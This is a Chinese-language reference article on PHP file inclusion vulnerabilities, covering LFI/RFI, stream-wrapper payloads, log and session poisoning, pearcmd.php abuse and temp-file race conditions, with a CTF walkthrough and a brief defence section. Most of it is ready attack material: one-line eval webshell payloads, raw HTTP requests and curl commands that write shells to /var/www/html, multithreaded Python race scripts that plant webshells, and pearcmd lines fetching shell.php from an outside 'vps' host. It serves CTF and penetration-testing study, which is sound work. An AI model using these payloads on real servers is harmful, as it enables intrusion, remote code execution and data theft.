# 包含漏洞 PHP

## 一句话理解
文件包含漏洞的核心是应用把用户可控路径传给 `include`、`require` 等函数，导致攻击者能够读取本地文件、包含远程资源或把已写入的恶意内容当成 PHP 代码执行。

## 危险函数
- `include()`
- `include_once()`
- `require()`
- `require_once()`

## 漏洞分类
### 1. LFI
LFI（Local File Inclusion，本地文件包含）是指攻击者控制包含路径，读取或执行本地文件内容。

### 2. RFI
RFI（Remote File Inclusion，远程文件包含）是指包含远程地址上的资源。

RFI 一般需要：
- `allow_url_fopen = On`
- `allow_url_include = On`

现代 PHP 环境中远程包含已相对少见，但 LFI 依然很常见。

## 常见成因
- 直接使用 `$_GET['file']`、`$_REQUEST['page']` 拼接模板路径
- 对文件名只做了弱过滤，例如只替换 `../`
- 业务支持主题、模板、插件动态加载
- 开发误以为“只能包含 `.php`”就安全

## 常见危害
- 读取配置文件、源码、凭证
- 读取日志、Session 文件、环境变量
- 配合日志注入、Session 注入实现代码执行
- 配合 `php://filter` 获取源码
- 配合 `phar://` 触发反序列化链

## 常见利用思路
### 1. 目录穿越
最常见的入口是通过路径穿越包含目标文件，例如：

```text
../../../../etc/passwd
```

### 2. 利用 PHP 包装器
PHP 提供多种 stream wrapper，在包含场景下经常非常关键。

### 3. 利用“可控文件内容”
如果攻击者能把 PHP 代码写入日志、Session、上传文件、临时文件，再通过 LFI 包含该文件，就可能获得代码执行。

## 常见包装器
### 1. `php://input`
可以访问原始请求体，在某些环境下可把 POST 内容作为 PHP 代码包含执行。

前提：
- 需要开启 `allow_url_include=On`
- 对 `allow_url_fopen` 无强依赖

示例：

```text
http://127.0.0.1/index.php?file=php://input
```

POST 数据：

```php
<?php phpinfo(); ?>
```

### 2. `php://filter`
最常用于源码读取，而不是直接执行。

前提：
- 只做读取时，通常只需要 `allow_url_fopen`

示例：

```text
http://127.0.0.1/index.php?file=php://filter/read=convert.base64-encode/resource=xxx.php
```

### 3. `zip://`
可以访问压缩包中的文件。

前提：
- 通常需要 PHP 版本支持
- `#` 常需编码为 `%23`

示例：

```text
http://127.0.0.1/index.php?file=zip://test.zip#shell.php
```

### 4. `phar://`
与 `zip://` 类似，但路径分隔方式不同。

示例：

```text
http://127.0.0.1/index.php?file=phar://test.phar/shell.php
```

> 在很多场景里，`phar://` 的重点不只是“包含文件”，更是“触发反序列化元数据”。

### 5. `data://`
可以直接把数据内容作为包含目标。

前提：
- `allow_url_fopen` 与 `allow_url_include` 均需开启

示例：

```text
http://127.0.0.1/index.php?file=data:text/plain,<?php phpinfo(); ?>
http://127.0.0.1/index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

### 6. `file://`
用于访问本地文件系统，一般不受 `allow_url_fopen` 与 `allow_url_include` 影响。

示例：

```text
http://127.0.0.1/index.php?file=file://文件绝对路径
```

## 常见二次利用点
### 1. Session 文件
前提：
- Session 文件路径已知
- Session 内容部分可控

常见路径：
- `/var/lib/php/sess_PHPSESSID`
- `/tmp/sess_PHPSESSID`
- `/tmp/sessions/sess_PHPSESSID`

文件名通常为 `sess_[PHPSESSID]`。

### 2. Web 日志
若能把 PHP 代码写进访问日志、错误日志，再通过 LFI 包含该日志，就可能实现代码执行。

常见日志位置：
- `/var/log/apache2/access.log`
- `/var/log/apache2/error.log`
- `/var/log/nginx/access.log`（Nginx 默认）
- `/var/log/nginx/error.log`（Nginx 默认）

#### 日志包含补充

把 payload 放进 `User-Agent`，随正常请求写入访问日志：

```http
GET /index.php HTTP/1.1
Host: target.com
User-Agent: <?php eval($_POST[1]);?>
Connection: close
```

再通过 LFI 包含日志文件触发执行：

```text
/index.php?file=../../../../var/log/nginx/access.log
POST: 1=system('cat /flag');
```

要点：

- 绕过空格限制：当空格被 WAF 或过滤逻辑拦截时，改用短标签 `<?=eval($_POST[1])?>`，`<?=` 在 PHP 5.4+ 恒定可用，且整个 payload 可以不带空格
- 日志会对双引号做转义，payload 内的字符串尽量用单引号
- 注意日志权限：`/var/log/nginx/` 下文件多为 `root:adm` 640，`www-data` 默认不可读（容器以 root 运行时无此限制）
- `error.log` 同样可投毒：非法 UA、超长请求头等内容会进错误日志

### 3. SSH 登录日志
前提：
- 日志路径已知
- 日志可读

常见位置：
- `/var/log/auth.log`

示例：

```text
$ ssh '<?php phpinfo(); ?>'@remotehost
```

### 4. `/proc/self/environ`
前提：
- PHP 以 CGI 等方式运行，环境变量中保留可控头部
- 文件路径可读

示例：

```http
GET /index.php?file=../../../../proc/self/environ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 <?phpinfo(); ?>
Connection: close
```

### 5. 上传目录
如果可以先上传可控文件，再通过 LFI 去包含上传文件，也可能实现执行。

## pearcmd.php 利用（LFI to RCE）

近年 CTF 高频技巧。当目标只有 LFI、无上传点、日志又不可写时，可以包含 PHP 自带的 PEAR 命令行工具 `pearcmd.php`，借助其命令行逻辑直接把 WebShell 写到服务器上。

### 1. 利用前提
- 服务器安装了 pear：PHP 7.3 及以前默认安装；7.4+ 需编译时加 `--with-pear`；Docker 官方 `php:*` 镜像任意版本默认安装
- `register_argc_argv = On`（php.ini 默认 Off；`php -S` 内置服务器等 CLI SAPI 下强制开启，CTF 题常见）
- 已知 `pearcmd.php` 的绝对路径且能被包含（未被 `open_basedir` 拦住）

### 2. 原理

（1）Web 环境下 query string 的“双重解析”：`register_argc_argv=On` 时，同一个 query string 会被解析成两套变量：

- `$_GET`：按 `&` 分割，供业务正常取参（`file=...` 由此传给 `include`）
- `$_SERVER['argv']`：URL 解码（`+` 还原为空格）后按空格分割成数组，模拟命令行参数

（2）pearcmd.php 通过 `Console_Getopt::readPHPArgv()` 获取参数，优先级为 `$argv` → `$_SERVER['argv']` → `$GLOBALS['HTTP_SERVER_VARS']['argv']`。Web 下全局 `$argv` 不存在，于是取到完全可控的 `$_SERVER['argv']`：

```php
public static function readPHPArgv()
{
    global $argv;
    if (!is_array($argv)) {
        if (!@is_array($_SERVER['argv'])) {
            if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) {
                $msg = "Could not read cmd args (register_argc_argv=Off?)";
                return PEAR::raiseError("Console_Getopt: " . $msg);
            }
            return $GLOBALS['HTTP_SERVER_VARS']['argv'];
        }
        return $_SERVER['argv'];   // Web 环境下走到这里，元素全部可控
    }
    return $argv;
}
```

（3）pearcmd.php 主流程把 argv 当命令行处理：先 `array_shift` 移除 argv[0]（所以 argv[0] 必须是空元素，payload 用 `+` 开头实现），再用 `getopt2` 解析，第一个位置参数作为子命令，其余作为命令参数：

```php
$argv = Console_Getopt::readPHPArgv();
array_shift($argv);                                          // 移除 argv[0]
$options = Console_Getopt::getopt2($argv, "c:C:d:D:Gh?sSqu:vV");
$command = (isset($options[1][0])) ? $options[1][0] : null;  // 第一个位置参数 = 子命令
// ... 省略中间解析 ...
$ok = $cmd->run($command, $opts, $params);                   // 执行子命令
```

（4）`config-create` 子命令的语法是 `config-create <root path> <filename>`：会把 root path 作为各配置目录的前缀，连同配置一起序列化写入 filename。root path 必须以 `/` 开头。攻击者把 PHP 代码放进 root path 位置，即可让代码落盘到任意可写路径。

对 payload `?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=phpinfo()?>+/var/www/html/shell.php`，参数最终去向：

```text
$_SERVER['argv'][0] = ""（空元素，被 array_shift 移除）
$_SERVER['argv'][1] = "config-create"             // 子命令
$_SERVER['argv'][2] = "/<?=phpinfo()?>"           // root path，被写进文件内容
$_SERVER['argv'][3] = "/var/www/html/shell.php"   // 写入的目标文件
$_GET['file']      = "/usr/local/lib/php/pearcmd.php"  // 被 include
```

生成的 `shell.php` 是 PEAR 序列化格式的配置文件，PHP 标签外的内容原样输出，标签内的代码照常执行：

```text
#PEAR_Config 0.9
a:1:{s:7:"php_dir";s:28:"/<?=phpinfo()?>/pear/php";...}
```

### 3. 利用方式（config-create 写 WebShell）

最常用 payload（GET 传参，注意 `+` 即空格）：

```text
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=phpinfo()?>+/var/www/html/shell.php
```

写一句话木马：

```text
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=@eval($_POST[1]);?>+/var/www/html/shell.php
```

参数顺序不固定，PayloadsAllTheThings 的等价写法把 `config-create` 放在最前（`&` 与 `file=...` 会原样保留在 argv 元素里，不影响 `$_GET` 解析）：

```text
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
```

写好后包含落盘文件即可执行：

```text
?file=/var/www/html/shell.php
POST: 1=phpinfo();
```

### 4. 完整 HTTP 报文示例

浏览器地址栏会对 `<?` 等字符自动编码导致 payload 变形，务必用 Burp 抓包或 curl 原样发送：

```http
GET /index.php?file=/usr/local/lib/php/pearcmd.php&+config-create+/%3C%3F%3Dphpinfo()%3F%3E+/var/www/html/shell.php HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Connection: close
```

等价 curl（外层用单引号防止 shell 转义）：

```bash
curl 'http://target.com/index.php?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=phpinfo()?>+/var/www/html/shell.php'
```

要点：

- 开头的 `+` 不能省略：它让 `argv[0]` 为空，`config-create` 才能落到 `argv[1]` 被当成子命令
- `+` 在 URL 中等价于空格，充当 argv 元素分隔符；`&` 只影响 `$_GET` 切分，会原样留在 argv 元素内
- `<?`、`>`、`$` 等字符建议 URL 编码（`%3C%3F`、`%3E`、`%24`），避免中途被浏览器/代理改写
- 报文里不要出现真实空格，全用 `+`（或 `%20`）代替

### 5. pearcmd 其他可利用命令

```text
# 方法二：-c 指定配置文件路径 + -d 写入配置项（值即 payload）+ -s 保存，同样无需出网
?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+

# 方法三：download 从外部地址下载文件（需目标能出网）
?file=/usr/local/lib/php/pearcmd.php&+download+http://vps:port/shell.php

# 方法四：install 安装远程包（需目标能出网），文件落在 /tmp/pear/download/ 下
?file=/usr/local/lib/php/pearcmd.php&+install+http://vps:port/shell.php
?file=/tmp/pear/download/shell.php
```

### 6. 常见 pear 路径
- `/usr/local/lib/php/pearcmd.php`：源码编译安装、Docker 官方 `php` 镜像（最常见）
- `/usr/share/php/pearcmd.php`、`/usr/share/php/PEAR/pearcmd.php`：Debian/Ubuntu `apt` 安装 php-pear

ThinkPHP 多语言文件包含（CVE-2022-38352）场景下框架会自动拼接 `.php` 后缀，直接传 `pearcmd` 即可：

```text
?lang=../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo()?>+/var/www/html/shell.php
```

### 7. 排错
- 包含后返回大段命令列表 / usage 报错：文件存在且 argv 生效，属正常现象
- 包含后完全空白：大概率 `register_argc_argv=Off`，放弃 pearcmd，改打日志 / session 竞争 / 临时文件竞争
- 写入失败：目标路径不可写（换 `/tmp`）或被 `open_basedir` 限制（换允许目录）
- payload 不生效：浏览器自动编码所致，确认用 Burp/curl 原样发送

## 临时文件竞争包含

### 1. 原理：上传临时文件

PHP 处理 multipart 上传时，无论业务代码是否保存文件，上传内容都会先落盘为临时文件：

- 路径为 `upload_tmp_dir`（默认 `/tmp`），文件名形如 `/tmp/php[a-zA-Z0-9]{6}`（前缀 php + 6 位随机字符）
- 临时文件在整个请求处理期间存在，请求结束立即被删除
- 只要能在请求结束前的窗口内包含它，文件里的 PHP 代码就会执行

### 2. phpinfo 泄露临时文件名 + 条件竞争

`phpinfo()` 会输出 `$_FILES`，其中包含本次上传的 `tmp_name`。目标若同时存在 phpinfo 页面与 LFI，即可竞争利用（经典利用链：Insomnia Security 的 LFI With PHPInfo Assistance 及其 phpinfolfi.py exploit）：

1. 线程 A 向 phpinfo 页面持续 POST 上传，文件内容即 PHP payload，体积调大以延长处理时间
2. phpinfo 输出是流式返回的：客户端一边读响应，一边在已读内容中搜索 `/tmp/phpXXXXXX`
3. 命中临时文件名的瞬间，原请求尚未结束、文件仍在磁盘上，立即另开连接通过 LFI 包含它
4. 高并发循环上述过程，直到某个窗口内包含成功

Python 多线程脚本思路（流式读响应是关键，等整份响应读完再包含就晚了）：

```python
import re
import threading
import requests

TARGET = "http://target/"
# payload 设计成"命中一次就落盘"：竞争成功后写入稳定 WebShell，之后无需再竞争
PAYLOAD = b"<?php file_put_contents('/var/www/html/s.php','<?php eval($_POST[1]);?>');?>"

def race():
    while True:
        # 上传多份大文件：phpinfo 输出更长，临时文件存活窗口更大
        files = {"f%d" % i: ("a.txt", PAYLOAD * 64) for i in range(4)}
        r = requests.post(TARGET + "phpinfo.php", files=files, stream=True)
        # 流式读响应，一发现临时文件名立刻包含（此时原请求还没结束）
        for chunk in r.iter_content(chunk_size=512):
            m = re.search(rb"/tmp/php[a-zA-Z0-9]{6}", chunk)
            if m:
                tmp = m.group().decode()
                r2 = requests.get(TARGET + "index.php", params={"file": tmp})
                if r2.status_code == 200:
                    print("[+] included temp file: " + tmp)

if __name__ == "__main__":
    for _ in range(16):
        threading.Thread(target=race, daemon=True).start()
    threading.Event().wait()  # 阻塞主线程，Ctrl+C 退出
```

成熟可用的完整 exploit 参考 Insomnia Security 的 `phpinfolfi.py`。

### 3. 无 phpinfo 时：fuzz 临时文件名

没有 phpinfo 泄露时只能爆破 `/tmp/php[0-9a-zA-Z]{6}`：

- 6 位随机字符共 62^6 ≈ 568 亿种组合，纯爆破几乎不可能命中
- 提高思路（PayloadsAllTheThings 的 race 打法）：一边海量并发 POST 上传（让 /tmp 下同时存在成百上千个 phpXXXXXX），一边对 `/tmp/php` + 6 位随机串做包含爆破，赌"撞上其中某个还活着的文件"
- 实际命中率依旧极低，实战优先换 pearcmd、日志或下面的 session.upload_progress 竞争

```python
# 思路示意：上传线程疯狂上传 + 包含线程爆破 6 位随机名
import itertools
import string
import threading
import requests

URL = "http://target/index.php"

def upload():
    # 文件内容为 <?php system($_GET['c']); ?>
    f = {"file": ("shell.php", b"<?php system($_GET['c']); ?>")}
    while True:
        # 持续上传，让 /tmp 下尽可能多地同时存在临时文件
        requests.post(URL, files=f)

def brute():
    alphabet = string.ascii_letters + string.digits
    for fname in itertools.product(alphabet, repeat=6):
        url = URL + "?c=/tmp/php" + "".join(fname)
        r = requests.get(url)
        if "load average" in r.text:  # payload 回显标志（system('uptime') 输出）
            print("[+] got shell: " + url)
            return

if __name__ == "__main__":
    threading.Thread(target=upload, daemon=True).start()
    brute()
```

### 4. session.upload_progress 竞争（无上传点也能打）

即使目标没有任何上传接口，只要 PHP 默认配置未改动，也能借 session 机制写入可控内容。

相关默认配置（php.ini，默认全部满足）：

```ini
session.upload_progress.enabled = On      ; 上传进度功能，默认开启
session.upload_progress.cleanup = On      ; POST 处理完立即清空进度数据，这是必须竞争的原因
session.upload_progress.prefix  = "upload_progress_"
session.upload_progress.name    = "PHP_SESSION_UPLOAD_PROGRESS"
session.use_strict_mode         = Off    ; 允许客户端自定义 PHPSESSID
```

关键机制：

- 只要 multipart POST 中带有 `PHP_SESSION_UPLOAD_PROGRESS` 字段，PHP 会自动初始化 session（业务代码不需要调用 `session_start()`）
- session 文件名为 `sess_<PHPSESSID>`，通过 Cookie 自定义 `PHPSESSID` 即可控制文件名
- `PHP_SESSION_UPLOAD_PROGRESS` 字段的值会被写入 session 文件，内容完全可控，可注入 `<?php ... ?>`
- `cleanup=On` 导致这些内容在 POST 处理完立即被清空，因此必须条件竞争：一边持续上传、一边持续包含

session 文件常见路径：

- `/tmp/sess_<PHPSESSID>`：PHP 默认 / 源码编译 / Docker 镜像
- `/var/lib/php/sessions/sess_<PHPSESSID>`：Debian/Ubuntu 下 php-fpm 的默认 `session.save_path`
- `/var/lib/php/sess_<PHPSESSID>`、`/tmp/sessions/sess_<PHPSESSID>`

完整请求报文（上传侧）：

```http
POST /index.php HTTP/1.1
Host: target.com
Cookie: PHPSESSID=exp01
Content-Type: multipart/form-data; boundary=----BoundaryAaB03x
Content-Length: 524288

------BoundaryAaB03x
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php file_put_contents('/var/www/html/s.php','<?php eval($_POST[1]);?>');?>
------BoundaryAaB03x
Content-Disposition: form-data; name="file"; filename="pad.bin"
Content-Type: application/octet-stream

AAAAAA......（大量填充数据：拖慢上传处理，扩大竞争窗口）
------BoundaryAaB03x--
```

竞争包含侧（请求越快越好）：

```http
GET /index.php?file=/tmp/sess_exp01 HTTP/1.1
Host: target.com
Connection: close
```

Python 竞争脚本：

```python
import io
import threading
import requests

TARGET   = "http://target/index.php"
SESSID   = "exp01"
SESSFILE = "/tmp/sess_" + SESSID   # Debian fpm 环境换成 /var/lib/php/sessions/sess_exp01
PAYLOAD  = "<?php file_put_contents('/var/www/html/s.php','<?php eval($_POST[1]);?>');?>"

def upload():   # 线程1：持续上传，让 session 文件里持续存在 payload
    while True:
        requests.post(TARGET,
                      data={"PHP_SESSION_UPLOAD_PROGRESS": PAYLOAD},
                      files={"file": ("pad.bin", io.BytesIO(b"A" * 512 * 1024))},
                      cookies={"PHPSESSID": SESSID})

def include_(): # 线程2：持续包含 session 文件
    while True:
        r = requests.get(TARGET, params={"file": SESSFILE})
        if "upload_progress" in r.text:   # 命中：序列化内容出现即 payload 已执行
            print("[+] race won, shell at /s.php")
            return

if __name__ == "__main__":
    threading.Thread(target=upload, daemon=True).start()
    include_()
```

Burp 手工打法（无脚本时）：

- Intruder 1（POST 上传包）：payload 选 Null、勾选无限重复，线程约 30
- Intruder 2（GET 包含包）：payload 选 Null、勾选无限重复，线程约 80（要大于上传线程数）
- 命中（包含包响应出现 session 内容 / s.php 可访问）后停止，连接 `http://target/s.php`

> 若 `session.upload_progress.cleanup=Off`，进度数据不会被清空，session 文件里的 payload 长期存在，无需竞争，直接包含一次即可。

### 5. Nginx 请求体临时文件（补充）

Nginx + PHP-FPM 环境下，POST body 超过 `client_body_buffer_size`（默认 8k/16k）时，Nginx 会把请求体落盘到 `client_body_temp_path`（默认 `/var/lib/nginx/body/` 或 `/var/cache/nginx/client_temp/`），文件名是递增数字（如 `0000000001`），不含随机后缀、完全可预测。

利用思路：multipart 大 body（内嵌 `PHP_SESSION_UPLOAD_PROGRESS=payload`）持续 POST，同时用 LFI 竞争包含 `/var/lib/nginx/body/0000000001`，编号从小到大尝试。因为文件名可预测，命中率比爆破 `/tmp/phpXXXXXX` 高得多（详见 PHP LFI with Nginx Assistance）。

## 常见绕过思路
### 1. 路径穿越绕过
- 双写 `../`
- 编码绕过
- 路径截断与标准化差异

### 2. 后缀限制绕过
若代码强制拼接 `.php`，仍需关注：
- 已有 `.php` 文件是否可控
- 日志或 Session 文件是否可被包含
- 包装器是否还能利用

### 3. 黑名单绕过
只过滤 `http://`、`../`、`php://` 通常都不够，攻击者往往能通过编码、包装器和其他文件落点继续利用。

## 实战排查思路
### 1. 先找包含入口
高频参数名：
- `file`
- `page`
- `template`
- `lang`
- `module`
- `inc`

### 2. 再确认包含结果
判断是：
- 只读取报错
- 真正执行
- 可控回显
- 盲包含

### 3. 再找二次利用链
优先确认是否存在：
- 日志可写
- Session 可控
- 上传点
- `phar://` 可达

## 案例：LFI CTF 完整利用流程

以一道典型 LFI 题为例（Docker 官方 `php:8.1-apache` 镜像部署，Apache + PHP 8.1，入口 `http://target/index.php`，可控参数 `file`）。环境无上传点、日志不可读，最终通过 pearcmd 拿下。

### Step 1：确认文件包含

```text
http://target/index.php?file=../../../../etc/passwd
```

回显 `root:x:0:0:...`，确认 LFI 存在。

### Step 2：php://filter 读源码，定位包含点

```text
http://target/index.php?file=php://filter/convert.base64-encode/resource=index.php
```

Base64 解码后得到核心源码：

```php
<?php
// index.php
$file = $_GET['file'] ?? 'welcome.php';
include $file;
```

结论：路径完全可控，无过滤、无后缀拼接。`/proc/self/environ`、日志均不可用时，转向 pearcmd。

### Step 3：探测 pearcmd.php

```text
http://target/index.php?file=/usr/local/lib/php/pearcmd.php
```

返回一大段 pear 命令列表 / usage 信息，说明：

- 文件存在（Docker 官方镜像 pear 默认装在 `/usr/local/lib/php/`）
- `register_argc_argv` 生效（否则 argv 读不到参数、直接空白退出）

若返回空白，说明 `register_argc_argv=Off`，应改打 session.upload_progress 竞争；若报 include failed，依次尝试 `/usr/share/php/pearcmd.php` 等路径。

### Step 4：config-create 写入 WebShell

Burp 抓包发送（注意 `+` 与空格、特殊字符编码；浏览器地址栏直接输入会失败）：

```http
GET /index.php?file=/usr/local/lib/php/pearcmd.php&+config-create+/%3C%3F%3D%40eval(%24_POST%5B1%5D)%3B%3F%3E+/var/www/html/shell.php HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Connection: close
```

query 解码后的语义：

```text
config-create /<?=@eval($_POST[1]);?> /var/www/html/shell.php
```

响应可能只返回少量配置信息（甚至空白），不影响落盘。随后验证写入：

```text
http://target/shell.php    → 不再 404，写入成功
```

### Step 5：连接 WebShell 拿 Flag

直接命令执行：

```http
POST /shell.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

1=system('cat /flag');
```

或用蚁剑连接 `http://target/shell.php`（密码 `1`），在文件管理中找到 flag。

### 常见失败点速查
- `register_argc_argv=Off`：pearcmd 输出空白 → 改打 session.upload_progress 竞争（见上文）
- `open_basedir` 限制写入：改写 `/tmp/shell.php`，再用 `?file=/tmp/shell.php` 包含
- shell.php 访问 404：Web 根目录判断错误，用 `?file=shell.php`（相对路径）验证文件是否生成
- payload 被改写：确认全程用 Burp/curl 发送原始报文

## 防御要点
### 1. 不要把用户输入直接传给包含函数
模板、语言包、模块名应使用固定映射关系，而不是拼接文件路径。

### 2. 严格白名单
仅允许预定义文件标识，不允许任意路径输入。

### 3. 关闭危险配置
若无业务需要，关闭：
- `allow_url_include`
- `allow_url_fopen`

### 4. 路径规范化与目录隔离
把可包含文件限制在固定目录，规范化后再校验。

### 5. 日志与 Session 不可执行
避免日志、Session、上传目录被当成 PHP 代码执行。

## 速查清单
- 先找 `include`、`require`、模板切换、语言包切换入口
- 先测本地文件读取，再测试包装器
- 重点看 `php://filter`、日志、Session、`/proc/self/environ`
- 若可上传文件，联动检查包含链
- 若存在 `phar://`，进一步检查反序列化利用面

## Reference
- [php 文件包含漏洞](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/)
- [浅谈文件包含漏洞](https://xz.aliyun.com/t/7176)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PayloadsAllTheThings - LFI to RCE（pearcmd / phpinfo 竞争 / session 等全姿势）](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/LFI-to-RCE/)
- [P 神：pearcmd.php 利用（跳跳糖社区）](https://tttang.com/archive/1312/)
- [pearcmd.php 源码（pear/pear-core 官方仓库）](https://github.com/pear/pear-core/blob/master/scripts/pearcmd.php)
- [LFI With PHPInfo Assistance（Insomnia Security，phpinfo 竞争原始论文）](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)
- [PHP LFI to RCE via rfc1867 临时文件（Gynvael Coldwind）](http://gynvael.coldwind.pl/?id=376)
- [Exploiting PHP_SESSION_UPLOAD_PROGRESS（ExploitDB #50157）](https://www.exploit-db.com/docs/50157)
- [PHP LFI with Nginx Assistance（Nginx 请求体临时文件竞争）](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
